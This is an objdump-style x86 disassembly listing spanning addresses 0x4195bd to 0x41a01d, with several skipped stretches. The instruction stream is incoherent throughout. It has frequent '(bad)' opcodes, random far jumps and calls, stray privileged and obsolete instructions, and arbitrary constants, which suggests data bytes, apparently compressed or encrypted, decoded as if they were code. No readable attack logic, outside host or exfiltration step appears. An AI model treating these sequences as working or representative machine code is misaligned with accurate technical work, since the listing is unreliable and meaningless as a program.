  4195bd:	sbb    eax,0xab986aa5
  4195c2:	cs jmp 0x2fd8:0x828feca2
  4195ca:	mov    esp,0x6e48c14c
  4195cf:	je     0x419588
  4195d1:	xor    ebp,ecx
  4195d3:	inc    edi
  4195d4:	or     BYTE PTR [ecx+ebx*2],0x28
  4195d8:	xor    al,0x81
  4195da:	mov    ds:0x490166d9,eax
  4195df:	icebp  
  4195e0:	xrelease mov BYTE PTR [ecx-0x6403b663],bl
  4195e7:	pop    es
  4195e8:	push   ecx
  4195e9:	jnp    0x4195b6
  4195eb:	sti    
  4195ec:	xchg   edx,eax
  4195ed:	mov    edi,0x67bc418f
  4195f2:	xlat   BYTE PTR ds:[bx]
  4195f4:	inc    edi
  4195f5:	cld    
  4195f6:	aam    0xd9
  4195f8:	cmp    BYTE PTR [edi-0x59f0637d],dh
  4195fe:	jnp    0x4195f7
  419600:	gs pop esp
  419602:	popf   
  419603:	sub    al,0x5b
  419605:	adc    eax,DWORD PTR [eax-0x30]
  419608:	dec    BYTE PTR [edx+0x3b]
  41960b:	(bad)  
  41960c:	ins    DWORD PTR es:[edi],dx
  41960d:	add    al,0xd8
  41960f:	mov    al,BYTE PTR [ecx+0x3]
  419612:	jae    0x41964e
  419614:	lds    esi,FWORD PTR [ebx-0x4048f276]
  41961a:	sbb    ch,BYTE PTR [edx+0x21]
  41961d:	loop   0x419615
  41961f:	cli    
  419620:	(bad)  
  419621:	loopne 0x419660
  419623:	pop    ebx
  419624:	popa   
  419625:	arpl   di,bx
  419627:	stos   BYTE PTR es:[edi],al
  419628:	push   cs
  419629:	add    al,0xf9
  41962b:	(bad)  
  41962c:	cwde   
  41962d:	aad    0x8f
  41962f:	pop    es
  419630:	inc    eax
  419631:	push   edi
  419632:	bound  ebp,QWORD PTR [ebx+0x6b8382fa]
  419638:	in     eax,dx
  419639:	repnz or DWORD PTR [edx-0x78220f34],ecx
  419640:	mov    dh,0x1a
  419642:	mov    bh,0x54
  419644:	and    al,0x53
  419646:	dec    esi
  419647:	out    dx,al
  419648:	repnz inc esi
  41964a:	jb     0x419679
  41964c:	fmul   QWORD PTR [esi]
  41964e:	lock ja 0x41967a
  419651:	cmp    esi,esi
  419653:	xchg   BYTE PTR [ebx],bl
  419655:	xchg   esp,eax
  419656:	ret    
  419657:	dec    esi
  419658:	repz jp 0x41962d
  41965b:	xor    eax,0xd4c0c8ac
  419660:	sbb    bh,ch
  419662:	mov    esi,0xa1811f2a
  419667:	xchg   esp,eax
  419668:	dec    ecx
  419669:	mov    ds:0x71a1285d,eax
  41966e:	xchg   ebx,eax
  41966f:	scas   eax,DWORD PTR es:[edi]
  419670:	sbb    al,0x81
  419672:	mov    al,0xba
  419674:	call   0xe72c:0xe36cff4a
  41967b:	xlat   BYTE PTR ds:[ebx]
  41967d:	fsubr  QWORD PTR [ebp+0x74916795]
  419683:	(bad)  
  419685:	mov    edi,0xb48cdc4d
  41968a:	in     al,dx
  41968b:	inc    ebx
  41968c:	gs cs dec esp
  41968f:	outs   dx,BYTE PTR ds:[esi]
  419690:	jp     0x4196cc
  419692:	mov    ds:0xb8690a66,al
  419697:	in     eax,dx
  419698:	or     ch,dl
  41969a:	or     eax,0x21f90502
  41969f:	hlt    
  4196a0:	cmp    DWORD PTR [esi-0x264b9ffd],eax
  4196a6:	in     al,dx
  4196a7:	xor    DWORD PTR [ecx-0x49f4b5e7],edx
  4196ad:	pusha  
  4196ae:	lods   eax,DWORD PTR ds:[esi]
  4196af:	push   DWORD PTR [edx-0x4150cd6f]
	...
  419715:	add    BYTE PTR [ebx-0x29a8ec1],dh
  41971b:	outs   dx,DWORD PTR ds:[esi]
  41971c:	mov    bh,0xff
  41971e:	inc    ebp
  41971f:	loop   0x419766
  419721:	dec    esp
  419722:	loopne 0x419798
  419724:	pop    ds
  419725:	jg     0x4196b1
  419727:	or     eax,DWORD PTR [ecx]
  419729:	add    BYTE PTR [edi],al
  41972b:	add    DWORD PTR [eax],eax
  41972d:	add    BYTE PTR ds:0xf2416d1d,al
  419733:	cli    
  419734:	mov    ah,0x35
  419736:	into   
  419737:	push   ds
  419738:	aad    0xac
  41973a:	addr16 pop edi
  41973c:	jmp    0xa0c6:0x14c8ecb2
  419743:	mov    ebp,0x914b5d43
  419748:	add    ch,BYTE PTR [ebx+0x56c89e77]
  41974e:	in     eax,0x79
  419750:	div    DWORD PTR [edi-0x4f]
  419753:	mov    eax,ds:0xeb1e3ab6
  419758:	mov    DWORD PTR [eax+0x2e],ecx
  41975b:	scas   al,BYTE PTR es:[edi]
  41975c:	xor    al,0x3c
  41975e:	int    0xe1
  419760:	imul   ebp,DWORD PTR [edx-0xf6f86ad],0x4cdbec20
  41976a:	repnz push ebx
  41976c:	xchg   esp,eax
  41976d:	or     edi,DWORD PTR [esi+0x2c]
  419770:	pop    ebp
  419771:	lea    eax,[ebp-0x2e]
  419774:	dec    esp
  419775:	xor    bh,BYTE PTR [ebp-0x6192f11b]
  41977b:	inc    ecx
  41977c:	mov    al,ds:0x781f66ef
  419781:	xchg   ebx,eax
  419782:	pop    ds
  419783:	outs   dx,DWORD PTR ds:[esi]
  419784:	xchg   ebx,eax
  419785:	sti    
  419786:	sbb    DWORD PTR [edi-0x5221bc23],edi
  41978c:	popf   
  41978d:	cmp    al,0x22
  41978f:	imul   eax,DWORD PTR [ecx],0xffffffbf
  419792:	xor    ebp,ebp
  419794:	push   cs
  419795:	adc    ah,BYTE PTR [eax+0x63dfa612]
  41979b:	sub    ecx,edx
  41979d:	mov    ah,0xca
  41979f:	hlt    
  4197a0:	adc    DWORD PTR [edi+0x668da766],ecx
  4197a6:	outs   dx,DWORD PTR ds:[esi]
  4197a7:	jae    0x4197b4
  4197a9:	jg     0x41977e
  4197ab:	psubsb mm0,QWORD PTR [ecx+ecx*4-0x66e433c5]
  4197b3:	jmp    0x419767
  4197b5:	pop    ebp
  4197b6:	and    ch,BYTE PTR [eax+0x6ee1b4d4]
  4197bc:	fndisi(8087 only) 
  4197be:	imul   edx,DWORD PTR [ebx+0x2e],0xe917def9
  4197c5:	dec    edi
  4197c6:	fisubr WORD PTR [ebx+0x72]
  4197c9:	loope  0x4197ac
  4197cb:	out    0x50,al
  4197cd:	scas   eax,DWORD PTR es:[edi]
  4197ce:	scas   eax,DWORD PTR es:[edi]
  4197cf:	push   ss
  4197d0:	jmp    0x41980c
  4197d2:	xor    bh,BYTE PTR [ecx]
  4197d4:	arpl   WORD PTR [esi],cx
  4197d6:	or     al,0xa5
  4197d8:	mov    edx,0xc677ff61
  4197dd:	ja     0x4197cb
  4197df:	cmc    
  4197e0:	xor    BYTE PTR [ebp+0x3],0x78
  4197e4:	add    eax,0x382240a5
  4197e9:	mov    ah,0x37
  4197eb:	test   DWORD PTR [ecx-0x15],ebx
  4197ee:	loope  0x419806
  4197f0:	jnp    0x419783
  4197f2:	(bad)  
  4197f3:	inc    eax
  4197f4:	shl    BYTE PTR [eax],cl
  4197f6:	mov    WORD PTR [eax],fs
  4197f8:	mov    WORD PTR [edx+ebx*2-0x598ca00e],cs
  4197ff:	sar    DWORD PTR [ebx-0x4c],1
  419802:	popf   
  419803:	imul   DWORD PTR [esi+0x62378e4e]
  419809:	and    al,0x98
  41980b:	xchg   esi,eax
  41980c:	arpl   sp,bx
  41980e:	fbld   TBYTE PTR ds:0xc2235a6e
  419814:	scas   al,BYTE PTR es:[edi]
  419815:	mov    dh,0x14
  419817:	mov    esi,0x1e547ba5
  41981c:	sub    bh,al
  41981e:	dec    esp
  41981f:	adc    DWORD PTR [esi+0x6],edi
  419822:	shr    esp,cl
  419824:	lods   al,BYTE PTR ds:[esi]
  419825:	mov    dl,0x4c
  419827:	cli    
  419828:	enter  0x2f16,0x85
  41982c:	pop    ss
  41982d:	adc    DWORD PTR [ebp+0x50f4bd4f],0xe067
	...
  419893:	add    BYTE PTR [eax],al
  419895:	add    BYTE PTR [edx-0x201eb8e7],al
  41989b:	jmp    DWORD PTR [esi-0x4a285f85]
  4198a1:	ficomp DWORD PTR [eax-0x6e9bdb4b]
  4198a7:	or     al,0x1
  4198a9:	add    BYTE PTR [edi],al
  4198ab:	add    DWORD PTR [eax],eax
  4198ad:	add    BYTE PTR [edi],ch
  4198af:	push   cs
  4198b0:	(bad)  
  4198b1:	out    0x63,al
  4198b3:	mov    edx,0xb647915b
  4198b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198b9:	xchg   BYTE PTR ds:0xed10c071,bh
  4198bf:	repnz pop edi
  4198c1:	push   ebx
  4198c2:	retf   0xcc67
  4198c5:	and    DWORD PTR [eax],esi
  4198c7:	and    BYTE PTR [eax+0x6a7b9df],dh
  4198cd:	mul    DWORD PTR [edi+eax*8]
  4198d0:	jmp    DWORD PTR [ebx]
  4198d2:	sub    eax,0x55bfce83
  4198d7:	mov    al,0x87
  4198d9:	jp     0x419870
  4198db:	add    ebx,esi
  4198dd:	push   esi
  4198de:	leave  
  4198df:	sbb    ch,BYTE PTR [ecx-0x19]
  4198e2:	mov    fs,WORD PTR [ebp-0x56]
  4198e5:	mov    ecx,DWORD PTR [edi-0x39]
  4198e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198e9:	les    esi,FWORD PTR [ebp+edx*1+0x42]
  4198ed:	scas   al,BYTE PTR es:[edi]
  4198ee:	in     eax,dx
  4198ef:	dec    eax
  4198f0:	sub    ch,BYTE PTR [edx+0x42cf5ac2]
  4198f6:	lea    ebx,[eax-0x2c846fb6]
  4198fc:	ds or  al,0x87
  4198ff:	adc    edi,0x7e32a1a3
  419905:	dec    ecx
  419906:	scas   al,BYTE PTR es:[edi]
  419907:	into   
  419908:	fimul  DWORD PTR [ebx-0x2dfd738c]
  41990e:	jne    0x41997c
  419910:	xchg   ecx,eax
  419911:	inc    esi
  419912:	or     al,0x6f
  419914:	push   cs
  419915:	leave  
  419916:	dec    edx
  419917:	cmp    al,0xdc
  419919:	enter  0x1f2a,0xe1
  41991d:	test   DWORD PTR [esi],eax
  41991f:	mov    ss,ebp
  419921:	push   ecx
  419922:	ret    0x6509
  419925:	hlt    
  419926:	cld    
  419927:	popa   
  419928:	fbstp  TBYTE PTR [esp+esi*2-0x59]
  41992c:	repnz lds esp,FWORD PTR [edx+eiz*4-0xca49e15]
  419934:	sahf   
  419935:	or     eax,0xf211ba32
  41993a:	adc    al,0x41
  41993c:	push   ss
  41993d:	or     ah,BYTE PTR [eax]
  41993f:	dec    ebx
  419940:	shr    DWORD PTR [edx+edx*4],1
  419943:	icebp  
  419944:	imul   ebx,DWORD PTR [eax],0x36
  419947:	out    0x41,eax
  419949:	dec    esp
  41994a:	fbld   TBYTE PTR ds:0x239fdcde
  419950:	xchg   ebx,eax
  419951:	sub    cl,BYTE PTR [esi-0x338cf5c9]
  419957:	scas   eax,DWORD PTR es:[edi]
  419958:	pop    ds
  419959:	xor    BYTE PTR [ecx],dl
  41995b:	xchg   ebx,eax
  41995c:	xchg   ebx,eax
  41995d:	inc    ecx
  41995e:	push   0xfffffff0
  419960:	or     DWORD PTR [ecx+0x7e328fbc],edi
  419966:	mov    dh,0xcb
  419969:	xchg   ebx,eax
  41996a:	pop    ebx
  41996b:	ror    cl,cl
  41996d:	dec    ecx
  41996e:	jg     0x419990
  419970:	test   DWORD PTR [esi+0x56],ebx
  419973:	dec    edi
  419974:	repnz inc BYTE PTR [ecx+0x79]
  419978:	rol    DWORD PTR [edx-0x72],0x89
  41997c:	clc    
  41997d:	sbb    eax,0xe885648a
  419982:	test   esp,eax
  419984:	sub    DWORD PTR ds:0x36063264,ebp
  41998a:	or     ecx,DWORD PTR [eax+0x47]
  41998d:	dec    eax
  41998e:	or     al,BYTE PTR [edi]
  419990:	and    BYTE PTR [edx+0x37005cbf],0xef
  419997:	ins    DWORD PTR es:[edi],dx
  419998:	mov    bh,0x35
  41999a:	push   esi
  41999b:	xchg   esi,eax
  41999c:	daa    
  41999d:	mov    al,0x9d
  41999f:	pop    ebx
  4199a0:	out    dx,eax
  4199a1:	es (bad) 
  4199a3:	adc    BYTE PTR [eax],bl
  4199a5:	(bad)  
  4199a6:	and    eax,0xf1768e19
  4199ab:	inc    ebx
  4199ac:	sub    eax,0xf119ea1e
  4199b1:	push   edx
  4199b2:	mov    al,ds:0xf19d
	...
  419a13:	add    BYTE PTR [eax],al
  419a15:	add    BYTE PTR [ebx],dh
  419a17:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a1d:	neg    DWORD PTR [ecx+0x16]
  419a20:	mov    eax,ds:0xe45cd309
  419a25:	dec    ebp
  419a26:	cwde   
  419a27:	or     eax,0x1070001
  419a2c:	add    BYTE PTR [eax],al
  419a2e:	xchg   DWORD PTR [eax-0x62],edi
  419a31:	and    BYTE PTR ds:0x16de20db,ah
  419a37:	stc    
  419a38:	push   edx
  419a39:	in     al,0x2
  419a3b:	cmp    edi,DWORD PTR [esi-0x358325de]
  419a41:	addr16 or eax,0xa5dbc1aa
  419a47:	inc    edi
  419a48:	push   ds
  419a49:	jecxz  0x419a2f
  419a4b:	sbb    ebx,esi
  419a4d:	clc    
  419a4e:	mov    edx,0x150c67ae
  419a53:	mov    dl,0x95
  419a55:	xchg   edx,eax
  419a56:	mov    BYTE PTR [esi+0x32],cl
  419a59:	iret   
  419a5a:	test   BYTE PTR [edx],0x15
  419a5d:	cld    
  419a5e:	mov    bl,0x1b
  419a60:	ror    BYTE PTR [edx],0x83
  419a63:	add    al,0xc9
  419a65:	sub    eax,0x769b8359
  419a6a:	ins    DWORD PTR es:[edi],dx
  419a6b:	repnz or BYTE PTR ds:0x32def349,ch
  419a72:	mov    al,0xa
  419a74:	pusha  
  419a75:	push   ds
  419a76:	daa    
  419a77:	push   edi
  419a78:	sbb    esp,DWORD PTR [eax+0x523f4ca3]
  419a7e:	and    BYTE PTR [bx],cl
  419a81:	pop    ebp
  419a82:	xor    DWORD PTR [ecx],0x47
  419a85:	lods   al,BYTE PTR ds:[esi]
  419a86:	popa   
  419a87:	call   0xa2bcf536
  419a8c:	sbb    dl,BYTE PTR [eax]
  419a8e:	dec    ecx
  419a8f:	repz rcl DWORD PTR [esi+ecx*8],0xe2
  419a94:	sbb    bl,BYTE PTR [edi+0x71]
  419a97:	sbb    al,0x25
  419a99:	jl     0x419a35
  419a9b:	jle    0x419a60
  419a9d:	mov    edx,0x6a67b5a
  419aa2:	loope  0x419b1d
  419aa4:	shl    BYTE PTR [edi+edx*8],1
  419aa7:	or     DWORD PTR [edi],0xffffffa6
  419aaa:	mov    cl,al
  419aac:	int    0x22
  419aae:	(bad)  
  419aaf:	jmp    DWORD PTR [eax+ebp*8]
  419ab2:	stos   BYTE PTR es:[edi],al
  419ab3:	shl    BYTE PTR [esi-0x6a498ce9],1
  419ab9:	aad    0x79
  419abb:	cli    
  419abc:	sbb    DWORD PTR [eax+0x3d3d8fc6],esp
  419ac2:	dec    edi
  419ac3:	cmp    eax,DWORD PTR [eax-0x3df0c82]
  419ac9:	rcr    DWORD PTR [esi-0x2d],cl
  419acc:	cmp    DWORD PTR es:[ecx+eiz*1-0x5],ebp
  419ad1:	push   eax
  419ad2:	xor    ebp,ebx
  419ad4:	out    0x4e,eax
  419ad6:	xlat   BYTE PTR ds:[ebx]
  419ad7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ad8:	and    eax,0x32b36bd5
  419add:	daa    
  419ade:	inc    edi
  419adf:	dec    edi
  419ae0:	rcl    BYTE PTR [edi+0x18],0x64
  419ae4:	xor    BYTE PTR [eax-0x62],bh
  419ae7:	or     eax,0xbc3db478
  419aec:	hlt    
  419aed:	mov    ds:0x56572934,eax
  419af2:	mov    ah,0x3b
  419af4:	sti    
  419af5:	les    ecx,FWORD PTR [esi]
  419af7:	scas   eax,DWORD PTR es:[edi]
  419af8:	push   edx
  419af9:	or     bh,BYTE PTR [eax]
  419afb:	jecxz  0x419aac
  419afd:	and    BYTE PTR ds:0x7cc37113,al
  419b03:	fisub  DWORD PTR [ebx]
  419b05:	es inc ebx
  419b07:	add    eax,0xc741d4f2
  419b0c:	and    BYTE PTR [edi-0x4c],0x8f
  419b10:	test   DWORD PTR [edx-0x9],esp
  419b13:	cmc    
  419b14:	bound  edi,QWORD PTR [edx-0x50]
  419b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b18:	repnz and edi,esp
  419b1b:	mov    ah,0xad
  419b1d:	mov    bh,0x3b
  419b1f:	xchg   BYTE PTR [eax+0x15],cl
  419b22:	test   eax,0x5289ea18
  419b27:	push   ebx
  419b28:	lahf   
  419b29:	xor    eax,0x538670f5
  419b2e:	sti    
  419b2f:	mov    ebx,0x89b7a58c
  419b34:	mov    DWORD PTR [eax],0x0
	...
  419b96:	dec    edx
  419b97:	(bad)  
  419b98:	cli    
  419b99:	inc    edi
  419b9a:	(bad)  
  419b9b:	jg     0x419b9c
  419b9d:	int    0xb7
  419b9f:	cs aam 0x47
  419ba2:	mov    BYTE PTR [edx+0xe9fbcfa],dh
  419ba8:	add    DWORD PTR [eax],eax
  419baa:	pop    es
  419bab:	add    DWORD PTR [eax],eax
  419bad:	add    BYTE PTR [ecx],dl
  419baf:	aam    0x9
  419bb1:	jecxz  0x419c12
  419bb3:	les    ecx,FWORD PTR [edx+0x69]
  419bb6:	nop
  419bb7:	jbe    0x419b63
  419bb9:	loope  0x419c04
  419bbb:	retf   0xa006
  419bbe:	add    DWORD PTR [edx-0x58],eax
  419bc1:	mov    ?,eax
  419bc3:	rcl    al,0xbf
  419bc6:	ds and al,0x7
  419bc9:	push   edi
  419bca:	ja     0x419c1d
  419bcc:	pushf  
  419bcd:	or     al,0xf7
  419bcf:	mov    cl,0x27
  419bd1:	xchg   edi,eax
  419bd2:	(bad)  
  419bd3:	cld    
  419bd4:	or     esp,DWORD PTR [edi-0x5ffd00de]
  419bda:	adc    eax,0x195ac4e2
  419bdf:	xchg   esi,ebx
  419be1:	fidiv  WORD PTR [edx+0x7f]
  419be4:	adc    ah,ah
  419be6:	arpl   WORD PTR [ebp+0x12],si
  419be9:	mov    ch,0xeb
  419beb:	(bad)  
  419bec:	inc    edi
  419bed:	in     eax,0x86
  419bef:	mov    dh,0x1a
  419bf1:	xor    ch,0x3c
  419bf4:	icebp  
  419bf5:	sub    esi,DWORD PTR [ecx+0x6992d448]
  419bfb:	int3   
  419bfc:	inc    esi
  419bfd:	inc    ecx
  419bfe:	mov    BYTE PTR [eax],al
  419c00:	dec    esi
  419c01:	shl    DWORD PTR [ecx-0x21],1
  419c04:	repz imul BYTE PTR [ebx+0x13dddb58]
  419c0b:	repz adc al,0xbf
  419c0e:	scas   al,BYTE PTR es:[edi]
  419c0f:	and    al,0x4e
  419c11:	ds (bad) 
  419c13:	jmp    0x6ceac569
  419c18:	gs jge 0x419c2e
  419c1b:	(bad)  
  419c1c:	dec    ecx
  419c1d:	cmp    DWORD PTR [edx],ebx
  419c1f:	add    eax,0xef48cf44
  419c24:	cmc    
  419c25:	sahf   
  419c26:	inc    esp
  419c27:	sub    eax,0x8c588060
  419c2c:	cli    
  419c2d:	out    dx,al
  419c2e:	jmp    0x918f5d95
  419c33:	mov    esi,0x42b1f721
  419c38:	or     DWORD PTR [ebp+0x1af407fa],0x45fcb2d4
  419c42:	inc    eax
  419c43:	jp     0x419be7
  419c45:	mov    ch,0xff
  419c47:	div    DWORD PTR [eax-0x3f]
  419c4a:	mov    al,ds:0x1d3cfcc8
  419c4f:	test   BYTE PTR [eax],0x1a
  419c52:	es fcmove st,st(5)
  419c55:	out    0x9,eax
  419c57:	push   ss
  419c58:	jmp    0x305a7f5a
  419c5d:	xor    al,0x41
  419c5f:	sbb    edx,DWORD PTR [eax-0x23]
  419c62:	mov    DWORD PTR [ebx+0x2],ecx
  419c65:	cmp    DWORD PTR [ebp+0x6c],0x6ff3e966
  419c6c:	imul   esi,edx,0xffffffad
  419c6f:	inc    ecx
  419c70:	xchg   ecx,eax
  419c71:	jo     0x419ce4
  419c73:	sar    cl,0x3e
  419c76:	mov    esi,DWORD PTR [ebp+0x7b]
  419c79:	push   es
  419c7a:	fcomp  DWORD PTR [eax+eax*2+0x6c]
  419c7e:	pusha  
  419c7f:	fisubr DWORD PTR [edi+0x775ce17e]
  419c85:	sub    edx,DWORD PTR [eax]
  419c87:	mov    edi,0xfdb7b4ae
  419c8c:	xor    al,0x5c
  419c8e:	retf   0x48ae
  419c91:	jne    0x419c3f
  419c93:	in     al,0x60
  419c95:	mov    eax,ds:0x6c7ab75c
  419c9a:	cmc    
  419c9b:	push   eax
  419c9c:	cs mov esi,0xd879d138
  419ca2:	aam    0xe6
  419ca4:	xor    BYTE PTR [ecx+0x7f9f1ce9],0xaf
  419cab:	fcmovbe st,st(4)
  419cad:	mov    bl,0xe4
  419caf:	mov    edi,0x4c6c6473
  419cb4:	test   DWORD PTR [eax],eax
	...
  419d16:	lock xchg edi,eax
  419d18:	std    
  419d19:	cmp    al,0xff
  419d1b:	jle    0x419d0e
  419d1d:	fistp  WORD PTR [eax]
  419d1f:	push   0x12279c45
  419d24:	and    ebx,DWORD PTR [edi+0x10fa6]
  419d2a:	pop    es
  419d2b:	add    DWORD PTR [eax],eax
  419d2d:	add    BYTE PTR [edi-0x19],dh
  419d30:	mov    ds:0x6e96f948,eax
  419d35:	gs in  al,dx
  419d37:	loopne 0x419d18
  419d39:	jmp    0xfb237d3e
  419d3e:	rcl    DWORD PTR [ebx+0x738b311],cl
  419d44:	jecxz  0x419d0c
  419d46:	jl     0x419d98
  419d48:	cmp    ebx,DWORD PTR [ecx+edi*4-0x1b7aefb9]
  419d4f:	pusha  
  419d50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d51:	jl     0x419d8a
  419d53:	(bad)  
  419d54:	ficom  DWORD PTR [ecx]
  419d56:	les    edx,FWORD PTR [eax+eiz*1-0x34]
  419d5a:	jae    0x419d04
  419d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d5d:	push   0x70ee2834
  419d62:	cli    
  419d63:	or     BYTE PTR [edx+0x35],ch
  419d66:	push   edx
  419d67:	in     al,0xfc
  419d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d6a:	fisub  WORD PTR [ecx-0x1b]
  419d6d:	mov    eax,0xe5c3c2b9
  419d72:	xor    eax,0xcb739f6b
  419d77:	rcl    bh,1
  419d79:	jo     0x419da0
  419d7b:	pop    ecx
  419d7c:	or     dl,BYTE PTR [esi-0x6]
  419d7f:	cdq    
  419d80:	push   ds
  419d81:	or     DWORD PTR [edx+0x41],eax
  419d84:	xchg   ebx,eax
  419d85:	mov    dh,0x28
  419d87:	ins    DWORD PTR es:[edi],dx
  419d88:	or     esp,DWORD PTR [esi]
  419d8a:	fcmovne st,st(3)
  419d8c:	aas    
  419d8d:	sbb    BYTE PTR [ecx-0x25862ac4],0x9b
  419d94:	pop    ebx
  419d95:	retf   
  419d96:	mov    ebx,0x891c8000
  419d9b:	retf   0x42fb
  419d9e:	mov    ebx,0x49c5310b
  419da3:	leave  
  419da4:	rcl    BYTE PTR [ebp+0x67114d50],1
  419daa:	rol    DWORD PTR [ebp+0x66],0x61
  419dae:	fs call 0xbd866ea9
  419db4:	mov    ebp,0x952a92e2
  419db9:	push   esi
  419dba:	add    eax,0x4bf76d5b
  419dbf:	dec    eax
  419dc0:	pop    es
  419dc1:	cmp    eax,0x853f9893
  419dc6:	xchg   ebx,eax
  419dc7:	je     0x419d93
  419dc9:	adc    al,ch
  419dcb:	rol    DWORD PTR [esi],0xc0
  419dce:	push   0xffffffee
  419dd0:	das    
  419dd1:	adc    ecx,DWORD PTR [eax+0x6c]
  419dd4:	pushf  
  419dd5:	lahf   
  419dd6:	jp     0x419dad
  419dd8:	inc    esp
  419dd9:	sub    BYTE PTR ds:0xd51a4fe6,bh
  419ddf:	imul   eax,DWORD PTR [ecx+ecx*4-0x2e50a3af],0xffffff90
  419de7:	mov    edx,DWORD PTR [ecx-0x40298240]
  419ded:	fild   DWORD PTR [edi-0x6b]
  419df0:	sbb    ecx,DWORD PTR [ebp+0x2a471c32]
  419df6:	int    0x75
  419df8:	mov    esp,0x46caf37
  419dfd:	sahf   
  419dfe:	dec    esi
  419dff:	call   0x123a:0xa6264848
  419e06:	nop
  419e07:	cmovbe esp,DWORD PTR es:[edi+edi*8-0xeeeb52e]
  419e10:	test   ecx,ebx
  419e12:	hlt    
  419e13:	cmp    eax,0x9ec5df41
  419e18:	cdq    
  419e19:	or     al,0x6d
  419e1b:	xor    al,BYTE PTR [ecx-0x3c8d906d]
  419e21:	(bad)  
  419e23:	cmp    bl,BYTE PTR [edi+0x52]
  419e26:	xchg   bh,dh
  419e28:	(bad)  
  419e29:	push   edi
  419e2a:	test   edx,0x7400202f
  419e30:	cmp    ebp,eax
  419e32:	mov    bl,0x98
  419e34:	mov    bh,0x0
	...
  419e96:	xchg   eax,ebx
  419e98:	pop    ss
  419e99:	lds    ebx,FWORD PTR [edi-0x31]
  419e9c:	xlat   BYTE PTR ds:[ebx]
  419e9d:	fimul  DWORD PTR [eax-0xdaf3a60]
  419ea3:	mov    DWORD PTR [edx+0x110ad61],esi
  419ea9:	add    BYTE PTR [edi],al
  419eab:	add    DWORD PTR [eax],eax
  419ead:	add    BYTE PTR [edi+esi*4+0x14],al
  419eb1:	into   
  419eb2:	fxam   
  419eb4:	jmp    0x38ed:0x4eb5c487
  419ebb:	test   al,0x80
  419ebd:	(bad)  
  419ebe:	outs   dx,BYTE PTR ds:[esi]
  419ebf:	mov    esi,0x8fe1ea35
  419ec4:	mov    al,0x97
  419ec6:	push   cs
  419ec7:	(bad)  
  419ec8:	sti    
  419ec9:	sub    dl,BYTE PTR [edi]
  419ecb:	dec    esp
  419ecc:	push   cs
  419ecd:	mov    ebx,DWORD PTR [ebx-0x2]
  419ed0:	jle    0x419ea8
  419ed2:	leave  
  419ed3:	call   0xb839fccd
  419ed8:	dec    ecx
  419ed9:	adc    dl,BYTE PTR [ebp-0x1a8cb798]
  419edf:	adc    al,0x2d
  419ee1:	lods   al,BYTE PTR ds:[esi]
  419ee2:	mov    al,ds:0xc0f8c23b
  419ee7:	int3   
  419ee8:	idiv   DWORD PTR ds:0x6a096141
  419eee:	adc    DWORD PTR [esi],edi
  419ef0:	f2xm1  
  419ef2:	inc    esp
  419ef3:	xchg   ecx,eax
  419ef4:	cmp    dh,BYTE PTR [edx+0xd]
  419ef7:	jecxz  0x419f1d
  419ef9:	adc    dh,bl
  419efb:	cs int3 
  419efd:	jo     0x419f50
  419eff:	in     eax,dx
  419f00:	push   cs
  419f01:	aas    
  419f02:	cmp    edx,DWORD PTR [edi+ebp*8-0x57]
  419f06:	dec    esi
  419f07:	and    DWORD PTR [edx-0x5f],edi
  419f0a:	mov    BYTE PTR [esi],al
  419f0c:	lea    edx,[eax]
  419f0e:	(bad)  
  419f0f:	pop    ds
  419f10:	lahf   
  419f11:	fsub   DWORD PTR [edx+ecx*4]
  419f14:	pop    ebx
  419f15:	push   0xa805043
  419f1a:	cmp    al,0x72
  419f1c:	fcomp  QWORD PTR [eax]
  419f1e:	cmp    esi,eax
  419f20:	xlat   BYTE PTR ds:[ebx]
  419f21:	inc    ebx
  419f22:	sub    ch,BYTE PTR [ebx+ebx*2-0x27bf05c0]
  419f29:	xchg   esp,eax
  419f2a:	cdq    
  419f2b:	jmp    0x419f1b
  419f2d:	lods   al,BYTE PTR ds:[esi]
  419f2e:	sti    
  419f2f:	xor    BYTE PTR [edi],bl
  419f31:	add    DWORD PTR [esi-0x19917a2],0x54f85f7e
  419f3b:	daa    
  419f3c:	daa    
  419f3d:	mov    edi,0xadc1cac9
  419f42:	loopne 0x419eef
  419f44:	mov    ecx,0x36b2c51b
  419f49:	inc    esp
  419f4a:	aaa    
  419f4b:	bound  ecx,QWORD PTR [edi+edi*4]
  419f4e:	push   ds
  419f4f:	mov    ecx,DWORD PTR [ebx+0x45]
  419f52:	clc    
  419f53:	mov    esi,DWORD PTR [eax-0x15c28f89]
  419f59:	je     0x419ef2
  419f5b:	pop    es
  419f5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f5d:	imul   eax,DWORD PTR [edx-0x93dd862],0xffffffa6
  419f64:	xor    BYTE PTR [ecx+eiz*2],0x89
  419f68:	jl     0x419f39
  419f6a:	xchg   edx,eax
  419f6b:	ror    DWORD PTR [ebx+0x3f],cl
  419f6e:	sar    ah,cl
  419f70:	mov    esp,es
  419f72:	dec    eax
  419f73:	fbld   TBYTE PTR [ebx-0x76]
  419f76:	jmp    0xcf4e:0x42c81420
  419f7d:	pop    esi
  419f7e:	xor    edi,DWORD PTR [esi-0x2e]
  419f81:	retf   
  419f82:	outs   dx,BYTE PTR ds:[esi]
  419f83:	sahf   
  419f84:	repz test ebp,esp
  419f87:	inc    esp
  419f88:	pop    eax
  419f89:	mov    ecx,DWORD PTR [ecx]
  419f8b:	hlt    
  419f8c:	adc    al,0xbd
  419f8e:	push   esi
  419f8f:	cmp    eax,0x40fe5ce6
  419f94:	or     BYTE PTR [eax-0x1d5af498],ah
  419f9a:	xchg   edi,eax
  419f9b:	mov    ds:0x7962105c,eax
  419fa0:	popf   
  419fa1:	inc    ecx
  419fa2:	out    0x68,al
  419fa4:	xchg   esi,eax
  419fa5:	push   es
  419fa6:	mov    ds:0x753a86ac,eax
  419fab:	cmp    eax,0x63732299
  419fb0:	test   DWORD PTR [ecx-0x13],0xa2b0
	...
  41a013:	add    BYTE PTR [eax],al
  41a015:	add    BYTE PTR [esi-0x15],cl
  41a018:	sub    cl,BYTE PTR [esi-0x51]
  41a01b:	iret   
  41a01c:	outs   dx,BYTE PTR ds:[esi]
  41a01d:	jmp    0x41a015
